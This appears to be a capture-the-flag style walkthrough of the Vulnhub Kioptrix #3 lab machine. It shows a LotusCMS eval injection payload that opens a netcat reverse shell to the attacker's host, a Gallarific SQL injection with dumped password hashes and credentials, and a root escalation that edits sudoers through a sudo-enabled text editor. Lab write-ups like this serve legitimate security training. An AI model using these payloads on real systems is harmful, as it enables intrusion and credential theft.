### [Vulnhub - Kioptrix #3](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)

## Enumeration
Lets add `kioptrix3.com` to `hosts` file and start off with `Nmap`

### Nmap
```bash

```

Found some interesting urls by browsing around and using `dirb`.
```bash
http://kioptrix3.com/phpmyadmin/
http://kioptrix3.com/gallery/gadmin/
http://kioptrix3.com/index.php?system=Admin
```

There are lot of methods to compromise this system. I will try to explain the ones I found.

# User Shell Method 1 (Lotus CMS RCE)
The webserver is using `LotusCms`. A quick search using `searchsploit` yielded some `RCE`

### Searchsploit
```bash
kali@kali:~$ searchsploit lotuscms
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)               | exploits/php/remote/18565.rb
```

Its a `metasploit` module. However since use of `metasploit` is limited during OSCP, I exploited it without `metasploit`

### Understanding LotusCms RCE  
>This module exploits a vulnerability found in Lotus CMS 3.0's Router() function. This is done by embedding PHP code in the 'page' parameter, 
>which will be passed to a eval call, therefore allowing remote code execution.

So we can escape the `eval` call and execute our own php code by appending `');`

A reverse shell can be execute using the following code
```bash
kioptrix3.com/index.php?page=index');exec("nc -e /bin/bash 192.168.174.3 1234"); //
```
Setup a `nc` listener to catch the request and use `python pty` module to upgrade it to a full TTY shell
```bash
kali@kali:~$ nc -lvp 1234
listening on [any] 1234 ...
connect to [192.168.174.3] from kioptrix3.com [192.168.174.5] 34305
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@Kioptrix3:/home/www/kioptrix3.com$    
```

## Low Shell Enumeration

There is a file named `gconfig.php` in `/home/www/kioptrix3.com/gallery` that contains the `db` credentials
```bash
www-data@Kioptrix3:/home/www/kioptrix3.com/gallery$ cat gconfig.php
cat gconfig.php
-------output snipped---------------
        $GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

        $GLOBALS["gallarific_mysql_server"] = "localhost";
        $GLOBALS["gallarific_mysql_database"] = "gallery";
        $GLOBALS["gallarific_mysql_username"] = "root";
        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";
-------output snipped---------------
```

We can use these credential to login to `phpmyadmin` and find credentials for `dreg` and `loneferret` and use it to `SSH` into the box.
But we have to crack the hashes to get the password.

# User Shell Method 2 (SQL Injection)

The web server is using `Gallarific`. It contains an SQL Injection in the following url.

```bash
http://kioptrix3.com/gallery/gallery.php?id=1%27&sort=filename#photos
```
![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/kioptrix3/sql1.png){: .align-center}

The sql error indicates that sql injection is possible. Lets dump the database using `sqlmap`

### SqlMap
```bash
Database: gallery
Table: dev_accounts
[2 entries]
+----+----------------------------------+------------+
| id | password                         | username   |
+----+----------------------------------+------------+
| 1  | 0d3eccfb887aabd50f243b3f155c0f85 | dreg       |
| 2  | 5badcaf789d3d1d09794d8f021f40f0e | loneferret |
+----+----------------------------------+------------+

Database: gallery
Table: gallarific_users
[1 entry]
+--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
| userid | email   | photo   | website | joincode | lastname | password | username | usertype  | firstname | datejoined | issuperuser |
+--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
| 1      | <blank> | <blank> | <blank> | <blank>  | User     | n0t7t1k4 | admin    | superuser | Super     | 1302628616 | 1           |

```
`sqlmap` found login for the users `dreg` and `loneferret` and also logins for `gallarffic`.

These hashes can be cracked using rainbow tables or by brute forcing.

### Crackstation (Rainbow Table Attack)
We can crack the hashes using online rainbow table hash cracker. [Crackstaion](crackstation.net/)

## Root Shell
After `SSH`ing into the box we can see that there is a file named `CompanyPolicy.README` which contains the following text.

```bash
loneferret@Kioptrix3:/home/loneferret# cat CompanyPolicy.README 
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
```

So we can run `sudo ht`. `ht` is a text editor and since its running as `root` we can gain `root` using one these methods
1. Edit `sudoers` file 
2. Add our key to `ssh`
3. Change the password file.

Since method 1 is the easiest, lets do it that way.

Before using `ht` we have to set the `$TERM` env variable to `xterm`
```bash
loneferret@Kioptrix3:/home/loneferret#export TERM=xterm
```
So lets open `sudoers` file and add `/bin/sh` to it.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/kioptrix3/root.gif){: .align-center}

And we are root!

## Afterthoughts
This box was comparatively easy to root. But that was not the case for me. This was because I failed to enumerate the box properly. Once I found a possible exploit
I immediately abandoned further enumeration and focused on that method alone and ended up getting stuck and had to look for hints. So I have learned a very important lesson form this box. Enumeration is the most important step.  
There seems to be a kernel exploit available for this box, but I did not try that out.
